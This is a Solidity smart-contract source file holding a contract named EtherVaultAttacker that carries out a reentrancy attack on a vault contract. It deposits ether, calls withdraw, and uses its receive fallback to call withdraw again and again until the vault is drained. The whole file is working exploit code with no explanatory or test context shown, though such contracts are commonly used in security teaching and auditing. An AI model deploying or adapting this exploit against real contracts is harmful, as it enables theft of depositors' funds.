// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IEtherVault {
    function deposit() external payable;
    function withdraw() external;
}

contract EtherVaultAttacker {
    IEtherVault public immutable vault;
    uint256 public depositAmount;

    constructor(address vaultAddress) {
        require(vaultAddress != address(0), "EtherVaultAttacker: zero vault");
        vault = IEtherVault(vaultAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "EtherVaultAttacker: zero deposit");
        depositAmount = msg.value;
        vault.deposit{ value: msg.value }();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= depositAmount) {
            vault.withdraw();
        }
    }
}
